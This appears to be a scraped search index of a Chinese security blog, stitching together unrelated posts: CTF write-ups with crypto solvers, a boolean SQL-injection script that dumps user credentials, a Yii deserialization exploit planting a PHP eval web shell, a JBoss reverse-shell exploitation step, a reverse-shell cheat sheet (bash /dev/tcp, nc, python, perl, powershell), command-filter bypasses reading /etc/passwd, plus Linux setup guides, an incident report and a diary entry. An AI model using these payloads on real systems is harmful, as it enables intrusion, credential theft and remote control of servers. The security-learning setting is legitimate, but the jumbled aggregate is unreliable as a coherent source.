cat /etc$u/passwd 命令执行函数绕过 system(&quot;cat /etc/passwd&quot;) &lt;=&gt; &quot;\\x73\\x79\\x73\\x74\\x65\\x6d&quot;(&quot;cat /etc/passwd&quot;); &lt;=&gt; (sy.(st).em)(&quot;cat /etc/passwd&quot;); &lt;=&gt;还可以用注释方法绕过 &quot;system/*fthgb666*/(&quot;cat /etc/passwd);&quot; &lt;=&gt; &quot;system/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);&quot; &lt;=&gt; &quot;(sy./*fthgb666*/(st)/*fthgb666*/.em)/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);&quot;","link":"/2018/05/03/ctf/ctf-knowledge-summary/"},{"title":"2021年红帽杯初赛ctf部分试题wp","text":"1 签到 EBC下载文件发现该文件为EBC编码 使用kali自带工具iconv解码得到flag Flag{we1c0me_t0_redhat2021} iconv -f EBCDIC-IT -t utf-8 redhat/EBCDIC.txt 2 密码学-hpcurve解密脚本 from itertools import product import struct p = 10000000000000001119 K = GF(p) R.&lt;x> = K[]; y=x f = y + prod(map(eval, 'yyyyyyy')) C = HyperellipticCurve(f, 0) J = C.jacobian() def get_u_from_out(output, known_input): res = [] for i in range(24): res.append(output[i]^^known_input[i]) res = bytes(res) u0, u1, u2 = struct.unpack(\"&lt;QQQ\", res) u = x^3+x^2*u2+x*u1+u0 return u def get_v_from_u(u): Kbar = GF(p^6) Rbar.&lt;t> = Kbar[\"t\"] u2 = u.change_ring(Rbar) roots = [x[0] for x in u2.roots()] ys = [] for root in roots: ys.append(f(root).sqrt(0,1)) res = [] for perm in product(range(2), repeat=3): poly = Rbar.lagrange_polynomial([(roots[i], ys[i][perm[i]]) for i in range(3)]) if poly[0] in K: res.append(R(poly)) return res def try_decode(output, u, v): rs = [u[0], u[1], u[2], v[0], v[1], v[2]] otp = struct.pack(\"&lt;QQQQQQ\", *rs) plain = [] otp = otp*2 for i in range(len(output)): plain.append(output[i]^^otp[i]) return bytes(plain) output = bytes.fromhex(\"66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5\") known_input = b\"aaaaaaaaaaaaaaaaaaaaflag\" u = get_u_from_out(output, known_input) vs = get_v_from_u(u) for v in vs: print(try_decode(output,u,v)) 在线运行sage代码 3 密码学-primegameexp.py: import math from decimal import * import random import struct getcontext().prec = int(100) primes = [2] for i in range(3, 100): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i) keys = [] for i in range(len(primes)): keys.append(Decimal(int(primes[i])).ln()) arr = [] for v in keys: arr.append(int(v * int(16) ** int(64))) # ct = 597952043660446249020184773232983974017780255881942379044454676980646417087515453 ct = 425985475047781336789963300910446852783032712598571885345660550546372063410589918 def encrypt(res): h = Decimal(int(0)) for i in range(len(keys)): h += res[i] * keys[i] ct = int(h * int(16)**int(64)) return ct def f(N): ln = len(arr) A = Matrix(ZZ, ln + 1, ln + 1) for i in range(ln): A[i, i] = 1 A[i, ln] = arr[i] // N A[ln, i] = 64 A[ln, ln] = ct // N res = A.LLL() for i in range(ln + 1): flag = True for j in range(ln): if -64 &lt;= res[i][j] &lt; 64: continue flag = False break if flag: vec = [int(v + 64) for v in res[i][:-1]] ret = encrypt(vec) if ret == ct: print(N, bytes(vec)) else: print(\"NO\", ret, bytes(vec)) for i in range(2, 1000): print(i) f(i) >>> a = [102, 108, 97, 103, 123, 55, 49, 53, 99, 51, 57, 99, 51, 45, 49, 98, 52, 54, 45, 52, 99, 50, 51, 45, 0] >>> flag = '' >>> for i in a: ... flag+=chr(i) ... >>> flag 'flag{715c39c3-1b46-4c23-\\x00' >>> a = [56, 48, 48, 54, 45, 50, 55, 98, 52, 51, 101, 98, 97, 50, 52, 52, 54, 125, 0, 0, 0, 0, 0, 0, 0] >>> flag = '' >>> for i in a: ... flag += chr(i) ... >>> flag '8006-27b43eba2446}\\x00\\x00\\x00\\x00\\x00\\x00\\x00' flag{715c39c3-1b46-4c23-8006-27b43eba2446} 4 web-web find it通过code直接写入phpinfo() http://eci-2zeg1tmyhxfbmpmn6585.cloudeci1.ichunqiu.com:80/?code=&lt;?php phpinfo();?&gt; 请求hack.php find搜索发现flag flag{f21c9e0c-b8a0-4191-8e69-3580273b9e91} 本想这道题需要写入shell完成命令执行，真没想到直接搜索，真是好题 5 web-注入注入脚本bool.py import requests import string import time import sys import urllib s = requests.session() header = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' } def getLength(url): return len(s.get(url, headers=header).text) def judgeLength(baseUrl, payload, resLength): for i in range(1000): url = baseUrl + urllib.parse.quote(payload % str(i)) if len(s.get(url, headers=header).text) == resLength: print((\">\" * 3) + \" \" + str(i)) return i return \"@\" def judgeString(baseUrl, payload, length, resLength): result = '' for i in range(1, length + 1): for c in string.printable: url = baseUrl + urllib.parse.quote(payload % (str(i), str(ord(c)))) if len(s.get(url, headers=header).text) == resLength: result += c print((\">\" * 3) + \" \" + result) break return result def getDatabase(url, resLength): payload1 = \"&amp;&amp;length(database())=%s\" length = judgeLength(url, payload1, resLength) payload2 = \"&amp;&amp;ascii(substr(database(),%s,1))=%s\" judgeString(url, payload2, int(length), resLength) def getTables(url, resLength): payload1 = \"&amp;&amp;length((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()))=%s\" length = judgeLength(url, payload1, resLength) payload2 = \"&amp;&amp;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),%s,1))=%s\" judgeString(url, payload2, int(length), resLength) def getColumns(url, resLength): payload1 = \"&amp;&amp;length((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&amp;&amp;table_name=0x7573657273))=%s\" length = judgeLength(url, payload1, resLength) payload2 = \"&amp;&amp;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&amp;&amp;table_name=0x7573657273),%s,1))=%s\" judgeString(url, payload2, int(length), resLength) def getResult(url, resLength): payload1 = \"&amp;&amp;length((select/**/group_concat(username,password)/**/from/**/users))=%s\" length = judgeLength(url, payload1, resLength) payload2 = \"&amp;&amp;ascii(substr((select/**/group_concat(username,password)/**/from/**/users),%s,1))=%s\" judgeString(url, payload2, int(length), resLength) if __name__ == '__main__': url = \"http://eci-2zefc95c45rh9xwew99q.cloudeci1.ichunqiu.com:80/image.php?id=1\" length = getLength(url) # getUser(url, length) # getDatabase(url, length) # getTables(url, length) ## images,users # getColumns(url, length) ## username,password getResult(url, length) ## admin xxx可能会不一样de 获取用户名密码 admin f7ba3a53d25a376074e36 直接登录后台跳转至modify.php 该页面存在ssrf 直接读文件直接获取flag file:///flag file:///flag TMD竞赛有非预期解 我不相信出题人故意干的 用御剑可以直接扫描出modify.php 且可以未授权访问 GG 6 web-framework御剑扫描去www.zip源码包审计发现是一个yii框架， 然后在网站找到YII的cve漏洞的playload（https://blog.csdn.net/xuandao_ahfengren/article/details/111259943），然后修改playload代码，编写exp代码 EXP &lt;?php namespace yii\\base{ class View{ } } namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this->checkAccess = 'assert'; $this->id = 'eval($_REQUEST[\"cmd\"])'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this->formatters['close'] = [new CreateAction(), 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this->_dataReader = new Generator; } } } namespace{ $a = new yii\\db\\BatchQueryResult; $a->checkAccess = array(new yii\\base\\View(),\"evaluateDynamicContent\"); echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?> 然后写入shell http://eci-2zeekzpgsy8b4rsdmpvb.cloudeci1.ichunqiu.com/index.php?r=site%2Fabout&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjI0OiJhc3NlcnQoJF9SRVFVRVNUWyJjbWQiXSkiO31pOjE7czozOiJydW4iO319fX0=&amp;cmd=die(file_put_contents(%27ab.php%27,%27%3C?php%20eval($_REQUEST[%22cmd%22]);?%3E%27)) 得到一个ab.php的 使用蚁剑链接，链接后发现有个readflag 的文件，但是无法直接读取权限为003，直接使用蚁剑的disable_function插件可绕过进行交互式shell读取如下 flag{c70db8f4-5fda-4981-93ab-45b61efd6703} 7 杂项-colorfulcodedata1中的数据范围为0-19，data2中的前60字节数据与后面的数据明显不同，猜测data2中前60字节为像素信息，每3字节一个RGB像素点，则刚好20个像素点，编号为0-19，正好对应data1中的0-19数据，使用脚本将data1中的数据替换为像素点，并创建成一张图片。 data1中数据为7067字节，即一共7067个像素点，分解为宽度高度只有一个结果即37131（或131*37） 编写脚本 from PIL import Image a = '0000000000C000FFFF00FF00FFC0FFFFC0C0C0C0FFC0C000FF00FFFF0000C00000C000C0FFFFFFFFFF00FFFFC000C00000C0C0C0FFFFC0FFC00000FF' px = [] for i in range(20): tmp = (int(a[i*6:i*6+2],16),int(a[i*6+2:i*6+4],16),int(a[i*6+4:i*6+6],16)) px.append(tmp) print len(px) pic = Image.new('RGB',(37,191)) f = open('data1','rb') str1 = f.read() f.close() str1 = str1.split(' ') num = 0 for x in range(37): for y in range(191): pic.putpixel((x,y), px[int(str1[num])]) num+=1 pic.show() pic.save('xxx.png') 执行脚本得到图片 在线进行转换 得到flag","link":"/2021/05/10/ctf/ctf-redhat2021/"},{"title":"windows下ip修改小公举","text":"场景说明公司经常会举办相关线下的安全的竞赛，支撑竞赛过程中经常遇到测试网络环境及靶机环境是否正常，此过程需要不断修改主机的IP地址。所以开发对应小工具来简化相关操作流程。功能较为简陋，只是简单的相关实现。 基本架构pyqt + python + win 模块实现 只能运行windows操作系统平台 功能介绍1 对应网卡选择及地址查询 2 静态地址设置支持手动ip地址输入静态配置，网关可为空 3 网络地址位增 1 减 1目前只实现了24位掩码网络位地址增1减1功能 4 一键DHCP功能静态地址配置完成后，可实现一键环境网卡的dhcp功能 5 简单web请求输入对应的ip地址可实现简单web请求功能，返回对应网页的状态码及原始页面内容。用于简单判断目标网站能否正常访问 项目链接源码 工具安装包","link":"/2021/03/17/devops-tools/win-changeip-tool/"},{"title":"ubuntu修改apt源","text":"修改ubuntu18.04的源为阿里源 修改ubuntu的apt源为阿里源ubuntu 18.04# 备份 mv /etc/apt/sources.list /etc/apt/sources.list # 新建阿里源 cat &gt; /etc/apt/sources.list &lt;&lt; EOF deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse EOF # 更新源 apt-get update &amp;&amp; apt-get upgrade ubuntu 16.04# 备份 mv /etc/apt/sources.list /etc/apt/sources.list # 新建阿里源 cat &gt; /etc/apt/sources.list &lt;&lt; EOF #deb包 deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse ##测试版源 deb http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiverse # 源码 deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse ##测试版源 deb-src http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiverse # Canonical 合作伙伴和附加 EOF # 更新源 apt-get update &amp;&amp; apt-get upgrade","link":"/2018/06/21/linux/Linux-ubuntu-apt-source/"},{"title":"ubuntu安装docker","text":"ubuntu下快速安装docker的步骤 ubuntu安装docker安装curl apt-get curl HTTPS存储库 apt-get install apt-transport-https ca-certificates curl software-properties-common 添加docker中科大源GPG密钥 curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add - 设定稳定存储库 sudo add-apt-repository “deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu $(lsb_release -cs) stable” 更新apt资源包，进行docker ce安装 apt-get update apt-get -y install docker-ce","link":"/2018/06/17/linux/ubuntu-install-docker/"},{"title":"jboss反序列化(CVE-2015-7501)","text":"漏洞概述Red Hat JBoss Application Server（AS，也称WildFly）是美国红帽（Red Hat）公司的一款基于JavaEE的开源的应用服务器，它具有启动超快、轻量、模块化设计、热部署和并行部署、简洁管理、域管理及第一类元件等特性。 红帽 JBoss A-MQ 6.x；BPM 套件 (BPMS) 6.x；BRMS 6.x 和 5.x；数据网格（JDG）6.x；数据虚拟化 (JDV) 6.x 和 5.x；企业应用平台 6.x、5.x 和 4.3.x；保险丝 6.x; 保险丝维修工程 (FSW) 6.x；运营网络（JBoss ON）3.x；传送门 6.x；SOA 平台 (SOA-P) 5.x；网络服务器（JWS）3.x；红帽 OpenShift/xPAAS 3.x；和 Red Hat Subscription Asset Manager 1.3 允许远程攻击者通过与 Apache Commons Collections (ACC) 库相关的精心设计的序列化 Java 对象执行任意命令。 漏洞利用使用 JavaDeserH2HC工具生成序列化数据 javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap ip:port curl http://vulfocus.fofa.so:38046/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser","link":"/2021/12/24/vulfocus/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2015-7501/"},{"title":"shiro权限绕过（CVE-2020-1957）","text":"漏洞介绍Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。2020年8月18日，Apache Shiro官方发布安全通告 Apache Shiro身份验证绕过漏洞（CVE-2020-13933），经过分析，攻击者可以通过构造特殊的HTTP请求实现身份验证绕过。Shiro框架通过拦截器功能来对用户访问权限进行控制，如anon, authc等拦截器。anon为匿名拦截器，不需要登录即可访问；authc为登录拦截器，需要登录才可以访问。主要是Spring web在匹配url的时候没有匹配上/导致绕过。 影响版本Apache Shiro &lt; 1.6.0 漏洞利用","link":"/2021/10/26/vulfocus/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88CVE-2020-1957%EF%BC%89/"},{"title":"内网渗透之端口转发","text":"lcx 端口转发应用公网服务器开启端口监听./portmap -m 2 -p1 3950 -h2 公网服务器IP -p2 3951 备注： 1 这里的3950端口和3951端口在公网IP上都是打开的 2 命令含义是将公网服务器监听的3950端口接收的数据转发至公网ip的3951端口 被控制主机转发端口lcx.exe -slave 公网服务器ip 3950 127.0.0.1 同网段互通主机开启监听Lcx.exe -listen 51 8888 监听本地的51端口将其转发到8888","link":"/2021/03/25/web-security/security-transform-port/"},{"title":"常见shell反弹姿势","text":"Linuxbash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1 telnet 192.168.217.135 4444 | /bin/bash | telnet 192.168.217.135 5555 rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 4444 0/tmp/p nc -e -t /bin/bash ip port rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x 9999 &gt;/tmp/f python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);' perl -e 'use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};' perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;' Windowsnc.exe -e cmd.exe 192.168.217.135 6666 powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.217.135 -p 6666 -e cmd 常见的界面写入文件方式echo base64_encode(reverse_shell)|base64 -d > /tmp/a.sh |chmod +x /tmp/a.sh|sh /tmp/a.sh echo hex_encode(reverse_shell)|xxd -r -p > /tmp/a.sh |chmod +x /tmp/a.sh|sh /tmp/a.sh","link":"/2021/02/20/web-security/shell-reverse/"},{"title":"Web安全技术体系导图","text":"","link":"/2020/03/11/web-security/web-security-frame/"},{"title":"记confluence的一次溯源","text":"记一次confluence挖矿溯源1、背景概述 2、事件分析该阿里云的系统客户部署一套了线上的confluence系统，且该系统是部署于我司的虎盾零信任安全访问系统内的，对其公网应用接口的暴露面进行了严格收敛。据得知客户在前天刚好将该收敛系统短暂暴露在公网中，增加其被攻击的可能性，导致最后被注入挖矿病毒。 前期获取客户某员工用户登录账户，获取当前使用的版本为Confluence 7.9.3 根据该系统版本，在互联网中发现该系统存在远程代码执行漏洞（CVE-2021-26084），且该系统漏洞在八月底被黑产大规模利用执行挖矿程序。 3、攻击分析查看系统进程，发现恶意运行进程 ps -ef 根据阿里云告警提示的路径该文件创建的时间为 Dec 13 12:42 下载该路径文件获取矿池地址j0llychic.com:9999 获取该矿池的IP地址165.232.129.60定位为美国的一个矿池地址 用户名和密码： “user”: “47W42XBUVVm3Nwc1h6dqN9YJm8XiCR5yzBpeiWjpUdAdJdpxT4bHVnoczTDvdG1xtsF3YSD1hJviq5bLFNTPVMcj7sNKvs4”,“pass”: “82b1ee75afa6”, 查看了一下目前恶意进程trace运行情况，该进程cpu占用率为15%，并未太高 系统日志中目前并未发现其他的可疑连接及运行进程 且confluence日志中也并未发现可疑的请求日志记录 目前大概率怀疑黑产是通过CVE-2021-26084漏洞部署的远程挖矿程序，且清空了相应的请求记录 4、病毒清理杀死进程ps -ef | grep trace kill -9 14387 文件清理rm -rf /root/c3pool/ 恶意进程不存在 矿池连接已不存在 5、漏洞复现漏洞验证，该系统存在CVE-2021-26084 无虎盾收敛，应用面暴露，直接利用 虎盾收敛应用暴露面，已知应用和版本漏洞的情况下，未达成利用 6、总结分析该客户系统部署于虎盾零信任安全产品体系下，并未遭受任何攻击，很好的对应用在公网的访问权限进行了严格限制和收敛。由于系统的短暂公网暴露，且该系统存在较新的版本漏洞，而遭受了此次严重的攻击，被黑客部署了挖矿病毒。 7、防范措施升级系统版本目前官方已在高版本中修复了该漏洞，请受影响的用户升级至安全版本。 https://www.atlassian.com/software/confluence/download-archives 安全版本列表 Atlassian Confluence Server/Data Center 6.13.23 Atlassian Confluence Server/Data Center 7.4.11 Atlassian Confluence Server/Data Center 7.11.6 Atlassian Confluence Server/Data Center 7.12.5 Atlassian Confluence Server/Data Center 7.13.0","link":"/2021/12/17/web-security/%E8%AE%B0confluence%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90/"},{"title":"Android Studio手动使用makefile编译","text":"Android Studio手动使用makefile编译用makefile文件编译能够选择编译的目标是共享库或者可执行文件。 新建Java工程用Android Studio新建一个普通Empty Activity项目。 新建 jni/cpp 目录在刚刚创建好的项目中，在src &gt; main目录下新建jni或者cpp目录。新建文件Android.mk、Application.mk以及源码文件。 Android.mk# Android.mk必须以LOCAL_PATH开头，注释#除外 # 设置工做目录，而my-dir则会返回Android.mk文件所在的目录 LOCAL_PATH := $(call my-dir) # 借助CLEAR_VARS变量清除除LOCAL_PATH外的全部LOCAL_&lt;name>变量 include $(CLEAR_VARS) # 设置模块的名称，即编译出来so或者可执行文件文件名 # 注，如果用Android Studio自带原生项目就要要和build.gradle中NDK节点设置的名字相同 LOCAL_MODULE := helloworld # 指定参与模块编译的C/C++源文件列表，多文件用\"\\\"隔开 LOCAL_SRC_FILES := helloworld.cpp #### 可选选项 LOCAL_CFLAGS += -fPIC LOCAL_LDFLAGS += -pie # 必须在文件结尾定义编译类型，指定生成的静态库或者共享库在运行时依赖的共享库模块列表。 # BUILD_SHARED_LIBRARY 共享库，供java或者其余共享库调用 # BUILD_STATIC_LIBRARY 静态库，供共享库调用，不能直接被java调用 include $(BUILD_SHARED_LIBRARY) fPIC和fPIE -fPIC与-fpic都是在编译时加入的选项，用于生成位置无关的代码(Position-Independent-Code)。这两个选项都是可以使代码在加载到内存时使用相对地址，所有对固定地址的访问都通过全局偏移表(GOT)来实现。-fPIC和-fpic最大的区别在于是否对GOT的大小有限制。-fPIC对GOT表大小无限制，所以如果在不确定的情况下，使用-fPIC是更好的选择。-fPIE与-fpie是等价的。这个选项与-fPIC/-fpic大致相同，不同点在于：-fPIC用于生成动态库，-fPIE用与生成可执行文件。再说得直白一点：-fPIE用来生成位置无关的可执行代码。 pie：随机地址。 Application.mk# 最经常使用的APP_ABI字段：指定须要基于哪些CPU平台的.so文件 # 常见的平台有armeabi x86 mips，其中移动设备主要是armeabi平台 # 默认状况下，Android平台会生成全部平台的.so文件，即同APP_ABI := armeabi x86 mips # 指定CPU平台类型后，就只会生成该平台的.so文件，即上述语句只会生成armeabi平台的.so文件 # APP_ABI := all armeabi armeabi-v7a mips x86 APP_ABI := armeabi-v7a APP_PLATFORM := android-23 # Android.mk设置可能不起效果，放在这里设置 APP_PIE := true # 其他可选 #APP_STL := c++_static #APP_CPPFLAGS := -fexceptions -frtti Application.mk中部分设置已经无效了，需要在build.gradle(Module: app)中的android &gt; defaultConfig声明这些参数的值。 CPP文件这里主要是源码的编写。 int helloWorld() { return 999; } 项目设置 添加编译cpp工程的NDK目录 指明Android.mk的路径。 在build.gradle(Module: app)中指明Android.mk的路径。 android { compileSdk 22 defaultConfig { applicationId &quot;com.example.cmake&quot; minSdk 21 targetSdk 22 versionCode 1 versionName &quot;1.0&quot; testInstrumentationRunner &quot;androidx.test.runner.AndroidJUnitRunner&quot; } buildTypes { release { minifyEnabled false proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro' } } externalNativeBuild { ndkBuild { path file('src/main/jni/Android.mk') } } compileOptions { sourceCompatibility JavaVersion.VERSION_1_8 targetCompatibility JavaVersion.VERSION_1_8 } } 编译在要使用的NDK版本中找到ndk-build，将前面添加入环境变量。 在makefile目录下输入命令ndk-build。 编译生成lib以及中间文件在上级目录。 IDA查看用IDA查看编译出来的库，只有一个我们编写的函数，直接F5查看源码。","link":"/2021/12/25/wechat/Android%20Studio%E6%89%8B%E5%8A%A8%E4%BD%BF%E7%94%A8makefile%E7%BC%96%E8%AF%91/"},{"title":"重新开始","text":"​ 时过境迁，微信公众号开通到零零散散的发了几篇文章已经是2019年的事情了。那个时候还是个意气风发、朝气蓬勃的精神小伙。只身一人就毅然决然的跑到了北京，想开拓了一片属于自己的天地，可能这就是那个时候年轻人所谓的“梦想“吧。 ​ 一转眼再回想时，已经快过了有四年的时间了。那个时候还没有疫情，目前生活方式和特点和当初来说已经发生了较大的变化了。真的不仅是生活方式和大环境发生了变化，人的心态更是发生了更大的变化。 ​ 今天刚好和前同事商量恢复公众号的运营，前同事也是欣然的答应接受了。挺好的，虽然最近两年一直在尝试着写博客，但是总觉得缺点什么东西。总感觉自己处于一个不伦不类的生活和工作状态中。自己总想着改变自己的生活方式和节奏状态，但总感觉心有余而力不足。其实这里的力不足并不是说自己能力不够，而是自己没有一个持之以恒的态度，去长期坚持做好一件事情。比如写公众号、看书、学英语、早起这些之前给自己定的计划和安排，总没有一个成功落地实施的。自己总是处于一种心浮气躁的状态，囫囵吞枣，啥都做一做，啥都弄一弄，但是啥都不专精。其实说白了，这就是一种无能的表现。一个人连控制自己做什么都做不到，那就是处于被某种东西支配的现状下获取短暂的及时行乐，到头来却一无是处。其实真的开心么，或许是短暂的开心，冲内心里来说，自己不愿意处于这种现状中，但是自己却又无力走出来。 ​ 借着这个机会刚好总结一下这段时间的现状。最近一直围绕着工作不停的瞎折腾，最近下半年前前后后两个月时间里换了三份工作。其实自己在想到底是工作环境不对，还是我这个人不对。大概是我这个人出了问题，我的心思变得异常浮躁，对于身边的一切都开始变得惶恐、焦躁不安。觉得工作环境不合适，不利于我的个人发展，在诸多方面受到了压制，总是看到这些不好的层面。回想一下当初的工作心态就是单纯的，进入安全行业，努力学习安全技术就好。但是现在不一样了，随着工作经验的增加，技术的所谓提升，能力的所谓增加，一个人的心态发生了完全的变化。人的欲望开始增加，不单纯于技术的提升，人变得不纯粹了，更多的想着钱怎么挣多了，地位提升了，是不是可以做领导了。再这样的情况下，所有的环境都不满足自己了。 ​ 改变吧，从心态上开始。慢慢适应，慢慢提升。希望公众号的运营能够再次启程，和朋友共同经营下能够越来越好吧！胡扯了这么多有的没的，就这样吧，结束。","link":"/2021/11/24/wechat/newstart/"},{"title":"校验签名是否被更改","text":"Android apk在签名中的一对抗。 Java代码的方式用Signature类中的hashCode()方法，校验签名是否被更改过。 try { PackageManager packageManager = this.getPackageManager(); String packageName = this.getPackageName(); PackageInfo packageInfo = packageManager.getPackageInfo(packageName, GET_SIGNATURES); Signature[] signatures = packageInfo.signatures; Signature signature = signatures[0]; int hashCode = signature.hashCode(); Log.v(\"NSSK_Log\", \"hash code : \" + hashCode); } catch (PackageManager.NameNotFoundException e) { e.printStackTrace(); } 在3种不同的签名的情况下，hashCode的结果是不一致的。 Java反射调用的方式在Java代码的基础上，我们可以用反射调用的方式来提高难度。 #include &lt;jni.h&gt; #include &lt;string.h&gt; extern &quot;C&quot; JNIEXPORT jint JNICALL Java_org_nisosaikou_signaturejni_MainActivity_checkSignature(JNIEnv *env, jobject thiz) { jclass cls_thiz = env-&gt;GetObjectClass(thiz); jmethodID mid_getPackageManager = env-&gt;GetMethodID(cls_thiz, &quot;getPackageManager&quot;, &quot;()Landroid/content/pm/PackageManager;&quot;); jobject obj_packageManager = env-&gt;CallObjectMethod(thiz, mid_getPackageManager); jmethodID mid_getPackageName = env-&gt;GetMethodID(cls_thiz, &quot;getPackageName&quot;, &quot;()Ljava/lang/String;&quot;); jstring packageName = (jstring)env-&gt;CallObjectMethod(thiz, mid_getPackageName); jclass cls_PackageManager = env-&gt;GetObjectClass(obj_packageManager); jmethodID mid_getPackageInfo = env-&gt;GetMethodID(cls_PackageManager, &quot;getPackageInfo&quot;, &quot;(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;&quot;); jobject obj_packageInfo = env-&gt;CallObjectMethod(obj_packageManager, mid_getPackageInfo, packageName, 64); jclass cls_PackageInfo = env-&gt;GetObjectClass(obj_packageInfo); jfieldID fid_signatures = env-&gt;GetFieldID(cls_PackageInfo, &quot;signatures&quot;, &quot;[Landroid/content/pm/Signature;&quot;); jobjectArray objs_signatures = (jobjectArray)env-&gt;GetObjectField(obj_packageInfo, fid_signatures); jobject obj_signature = env-&gt;GetObjectArrayElement(objs_signatures, 0); jclass cls_Signature = env-&gt;GetObjectClass(obj_signature); jmethodID mid_hashCode = env-&gt;GetMethodID(cls_Signature, &quot;hashCode&quot;, &quot;()I&quot;); jint hashCode = env-&gt;CallIntMethod(obj_signature, mid_hashCode); return hashCode; }","link":"/2020/10/12/wechat/%E6%A0%A1%E9%AA%8C%E7%AD%BE%E5%90%8D%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"常用数据库提权手段","text":"SQL Server常用提权基础知识由于sqlserver服务在没有降权的情况下默认以system权限运行，一旦我们掌握了sqlserver的控制权限就有可能利用system权限对操作系统进行控制，从而导致权限的提升。在sqlserver中存在一些官方自带的存储过程，其中一些可以直接或间接执行系统命令。我们常用的提权操作大多都依赖于这些存储过程 存储过程的概念： 存储过程（Stored Procedure）是在大型数据库系统中，一组为了完成特定功能的SQL 语句集，存储在数据库中，经过第一次编译后再次调用不需要再次编译，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。存储过程是数据库中的一个重要对象，任何一个设计良好的数据库应用程序都应该用到存储过程。 